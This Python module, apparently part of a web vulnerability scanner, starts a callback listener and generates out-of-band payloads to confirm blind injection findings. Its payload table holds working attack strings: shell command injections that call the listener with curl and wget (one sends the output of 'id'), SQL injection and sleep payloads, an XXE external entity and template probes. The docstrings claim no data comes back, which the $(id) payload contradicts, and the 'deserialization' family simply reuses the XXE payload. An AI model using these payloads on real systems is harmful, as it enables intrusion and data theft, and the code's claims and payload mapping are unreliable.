import json
import secrets
import socket
import threading
import time
import uuid
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse

from config import TIMEOUT
from core.banner import found, info, vuln, warning


class BoundedCallbackServer(ThreadingHTTPServer):
    daemon_threads = True

    def __init__(self, *args):
        self.slots = threading.BoundedSemaphore(8)
        super().__init__(*args)

    def process_request(self, request, client_address):
        if not self.slots.acquire(blocking=False):
            self.shutdown_request(request)
            return
        try:
            super().process_request(request, client_address)
        except BaseException:
            self.slots.release()
            raise

    def process_request_thread(self, request, client_address):
        try:
            super().process_request_thread(request, client_address)
        finally:
            self.slots.release()




PAYLOAD_FAMILIES = {
    "blind-command": {
        "kind": "command-injection",
        "label": "blind command execution",
        "shell": [
            "curl {host}", "wget -O- {host}", "curl {host}/$(id)",
            "nslookup {tag}.{domain}",
        ],
        "context": "submit as a parameter value that is later passed to a shell",
    },
    "blind-sqli": {
        "kind": "sqli",
        "label": "blind SQL injection",
        "shell": [
            "LOAD_FILE('\\\\\\\\{host}\\\\x')", "1' OR 1=1 WAITFOR DELAY '0:0:5'--",
            "1';SELECT pg_sleep(5)--",
        ],
        "context": "submit as a parameter value that reaches the SQL layer",
    },
    "blind-ssrf": {
        "kind": "ssrf",
        "label": "blind server-side request forgery",
        "shell": ["{host}"],
        "context": "submit as any url/path/endpoint/callback parameter value",
    },
    "blind-ssrf-dns": {
        "kind": "ssrf",
        "label": "blind SSRF via DNS resolution",
        "shell": ["{tag}.{domain}"],
        "context": "submit as a parameter the server will try to resolve",
    },
    "blind-xxe": {
        "kind": "xxe",
        "label": "blind XML external entity",
        "shell": [
            "<!DOCTYPE d [<!ENTITY x SYSTEM \"http://{host}/x\">]><d>&x;</d>",
        ],
        "context": "submit as XML content where a document is parsed server-side",
    },
    "blind-template": {
        "kind": "ssti",
        "label": "blind template injection",
        "shell": ["{{7*7}}", "${7*7}", "#{7*7}"],
        "context": "submit as a template-rendered parameter value",
    },
    "blind-deserialization": {
        "kind": "deserialization",
        "label": "blind deserialization",
        "shell": [
            "<!DOCTYPE d [<!ENTITY x SYSTEM \"http://{host}/x\">]><d>&x;</d>",
        ],
        "context": "submit as a serialized-object parameter value",
    },
}

DNS_STAMPS = "abcdefghijklmnopqrstuvwxyz0123456789"


class OOBListener:
    """A callback receiver that proves execution without reading anything.

    The payload asks the target to make an outbound request. What the operator
    learns is only: the server reached this address, at this time, from this
    source. No response body, no query result and no file contents come back,
    which is what separates confirmation from data extraction.
    """

    def __init__(self, bind_host: str = "127.0.0.1", port: int = 0, console=None):
        self.bind_host = bind_host
        self.port = port
        self.console = console
        self.token = secrets.token_hex(8)
        self._callbacks = []
        self.issued_paths = set()
        self._seen_paths = set()
        self._lock = threading.Lock()
        self._server = None
        self._thread = None
        self.started = False
        self.public_host = None

    def _handler(self):
        listener = self

        class Handler(BaseHTTPRequestHandler):
            protocol_version = "HTTP/1.1"

            def log_message(self, *args):
                pass

            def setup(self):
                self.request.settimeout(2)
                super().setup()

            def _record(self, method):
                parsed = urlparse(self.path)
                raw = f"{method} {self.path}"
                with listener._lock:
                    if parsed.path not in listener.issued_paths or parsed.path in listener._seen_paths or len(listener._callbacks) >= 256:
                        self.send_error(404)
                        return
                    listener._seen_paths.add(parsed.path)
                    listener._callbacks.append({
                        "received_at": time.time(),
                        "method": method,
                        "path": self.path,
                        "query": parsed.query,
                        "source": self.client_address[0] if self.client_address else "",
                        "user_agent": self.headers.get("User-Agent", ""),
                        "raw": raw[:500],
                        "payload_token": (parsed.path.strip("/").split("/", 1)[0]
                                          if parsed.path.strip("/") else ""),
                    })
                if listener.console:
                    found(listener.console,
                          f"[OOB] callback {method} {self.path} from "
                          f"{self.client_address[0] if self.client_address else 'unknown'}")
                try:
                    body = b"ok"
                    self.send_response(200)
                    self.send_header("Content-Type", "text/plain")
                    self.send_header("Content-Length", str(len(body)))
                    self.send_header("Connection", "close")
                    self.end_headers()
                    self.wfile.write(body)
                except Exception:
                    pass

            def do_GET(self):
                self._record("GET")

            def do_POST(self):
                try:
                    length = int(self.headers.get("Content-Length", 0) or 0)
                except ValueError:
                    self.send_error(400)
                    return
                if not 0 <= length <= 4096:
                    self.send_error(413)
                    return
                if length:
                    try:
                        self.rfile.read(min(length, 4096))
                    except Exception:
                        pass
                self._record("POST")

            def do_HEAD(self):
                self._record("HEAD")

        return Handler

    def start(self, public_host=None):
        try:
            self._server = BoundedCallbackServer((self.bind_host, self.port), self._handler())
        except OSError as e:
            warning(self.console, f"OOB listener could not bind {self.bind_host}:{self.port} - {e}")
            return False
        self.port = self._server.server_address[1]
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()
        self.started = True
        self.public_host = public_host or self.bind_host
        return True

    def stop(self):
        if self._server:
            try:
                self._server.shutdown()
                self._server.server_close()
            except Exception:
                pass
        self.started = False

    @property
    def address(self) -> str:
        host = self.public_host or self.bind_host
        if ":" in host and not host.startswith("["):
            host = f"[{host}]"
        return f"http://{host}:{self.port}"

    @property
    def domain(self) -> str:
        return f"{self.public_host or self.bind_host}"

    def stamp(self) -> str:
        return f"{self.token}"

    def callbacks(self) -> list:
        with self._lock:
            return list(self._callbacks)

    def burst(self, family: str, index: int, correlation="") -> str:
        """Substitute the listener address into a template.

        str.replace rather than str.format, because payloads for template
        injection legitimately contain braces of their own and .format() would
        either mangle them or raise on them.
        """
        spec = PAYLOAD_FAMILIES[family]
        template = spec["shell"][index % len(spec["shell"])]
        address = f"{self.address}/{self.token}/{family}/{index}"
        if correlation:
            address += "/" + correlation
        domain = self.domain
        tag = f"{self.token}.{domain}"
        return (template.replace("{host}", address)
                       .replace("{domain}", domain)
                       .replace("{tag}", tag))


class OOBModule:
    """Confirms blind findings by out-of-band request rather than by response.

    A blind injection is a guess. A callback is evidence. This stage starts a
    local receiver, builds payloads that only ask the server to connect back, and
    leaves the actual submission to the operator - it never fires them itself.
    """

    def __init__(self, target: str, console, bind_host: str = "127.0.0.1",
                 public_host: str = None, port: int = 0):
        self.target = target
        self.console = console
        self.bind_host = bind_host
        self.public_host = public_host
        self.port = port
        self.listener = None
        self.payloads = []
        self.callbacks_confirmed = []
        self._family_targets = {}
        self._issued = {}
        self._consumed = set()
        self.note = ""

    def start(self):
        if self.public_host is None:
            self.note = (
                "The listener is bound to a loopback address, so remote targets cannot reach it. "
                "Re-run with --oob-host <public address> to receive callbacks from a remote host."
            )
        self.listener = OOBListener(self.bind_host, self.port, self.console)
        if not self.listener.start(self.public_host):
            self.listener = None
            return False
        info(self.console, f"OOB listener started: {self.listener.address} "
                           f"(token {self.listener.token})")
        return True

    def stop(self):
        if self.listener:
            self.listener.stop()

    def build(self, blind_findings):
        """Generate payloads for the families implied by unconfirmed findings.

        Works whether or not the listener is running: payloads are still produced
        so the operator can submit them by hand against an address they supply.
        """
        if self.listener is None:
            self.listener = OOBListener(self.bind_host, self.port, self.console)
            self.listener.public_host = self.public_host

        self.payloads = []
        self.callbacks_confirmed = []
        self._family_targets = {}
        self._issued = {}
        self._consumed = set()
        self.listener.issued_paths = set()
        self.listener._seen_paths = set()
        families = set()

        for finding in blind_findings or []:
            kind = finding.get("kind")
            for family, spec in PAYLOAD_FAMILIES.items():
                if spec["kind"] == kind:
                    families.add(family)

        for family in sorted(families):
            spec = PAYLOAD_FAMILIES[family]
            targets = sorted({
                str(item.get("target", "")) for item in (blind_findings or [])
                if item.get("kind") == spec["kind"] and item.get("target")
            })
            self._family_targets[family] = targets
            entries = []
            for target in targets:
                for index in range(len(spec["shell"])):
                    correlation = secrets.token_hex(8) if len(targets) > 1 else ""
                    path = f"/{self.listener.token}/{family}/{index}" + ("/" + correlation if correlation else "")
                    self._issued[path] = {"family": family, "kind": spec["kind"], "target": target}
                    self.listener.issued_paths.add(path)
                    entries.append(self.listener.burst(family, index, correlation))
            self.payloads.append({
                "family": family,
                "label": spec["label"],
                "kind": spec["kind"],
                "context": spec["context"],
                "targets": targets,
                "payloads": [e for e in entries if e and "{host}" not in e],
            })
        return self.payloads

    def _enrich_callback(self, event):
        enriched = dict(event or {})
        path = urlparse(str(enriched.get("path", ""))).path
        issued = self._issued.get(path)
        if not issued or path in self._consumed:
            return None
        self._consumed.add(path)
        enriched.update(issued)
        enriched["candidate_targets"] = [issued["target"]]
        enriched["correlated"] = True
        return enriched

    def run(self, blind_findings=None, wait_seconds: float = 5.0, start=True):
        if start and not self.start():
            return {"started": False, "note": self.note, "payloads": [], "confirmed": []}

        if self.listener is None:
            return {"started": False, "note": "listener unavailable",
                    "payloads": [], "confirmed": []}

        self.build(blind_findings)

        for group in self.payloads:
            info(self.console,
                f"[OOB] {group['label']}: {len(group['payloads'])} candidate payload(s) "
                f"- {group['context']}")
            for payload in group["payloads"]:
                info(self.console, f"        {payload[:120]}")

        if self.note:
            warning(self.console, self.note)

        before = len(self.listener.callbacks())
        if wait_seconds > 0:
            time.sleep(min(wait_seconds, 10))

        new = [self._enrich_callback(event) for event in self.listener.callbacks()[before:]]
        new = [event for event in new if event is not None]
        for event in new:
            self.callbacks_confirmed.append(event)
            vuln(self.console,
                f"OOB CONFIRMED: {event['method']} {event['path']} from {event['source']}")

        result = {
            "started": True,
            "address": self.listener.address,
            "token": self.listener.token,
            "payloads": self.payloads,
            "confirmed": self.callbacks_confirmed,
            "callback_count": len(self.callbacks_confirmed),
            "wait_seconds": wait_seconds,
            "note": self.note,
        }

        if not new:
            info(self.console, f"No callback received within {wait_seconds}s for "
                               f"{len(self.payloads)} payload family/families. "
                               "Nothing was executed on the server by these payloads.")
        else:
            found(self.console, f"{len(new)} callback(s) received - blind injection "
                                f"is confirmed by out-of-band evidence.")
        return result

    @staticmethod
    def blind_candidates(results) -> list:
        """Findings whose confidence depends on a response that may never come."""
        candidates = []
        supported = {spec["kind"] for spec in PAYLOAD_FAMILIES.values()}

        vulns = results.get("vulns", {}) or {}
        for kind, entries in vulns.items():
            if kind in ("sensitive_files", "admin_panels", "backup_files",
                        "info_disclosure", "cors_misconfig", "clickjacking"):
                continue
            normalised_kind = str(kind).replace("_", "-")
            if normalised_kind.endswith("s") and normalised_kind[:-1] in supported:
                normalised_kind = normalised_kind[:-1]
            if normalised_kind not in supported or not isinstance(entries, (list, tuple)):
                continue
            for entry in entries:
                if not isinstance(entry, dict) or entry.get("verified") is False:
                    continue
                candidates.append({
                    "kind": normalised_kind,
                    "target": entry.get("url") or entry.get("path", ""),
                    "confidence": 0.6,
                })

        params = (results.get("attack_surface", {}) or {})
        for param in (params.get("params_detail", []) or [])[:60]:
            candidates.append({
                "kind": "sqli", "target": param.get("url", ""),
                "confidence": 0.5,
            })
            candidates.append({
                "kind": "ssrf", "target": param.get("url", ""),
                "confidence": 0.5,
            })
        unique = {}
        for candidate in candidates:
            key = (candidate.get("kind"), candidate.get("target"))
            if all(key):
                unique.setdefault(key, candidate)
        return list(unique.values())
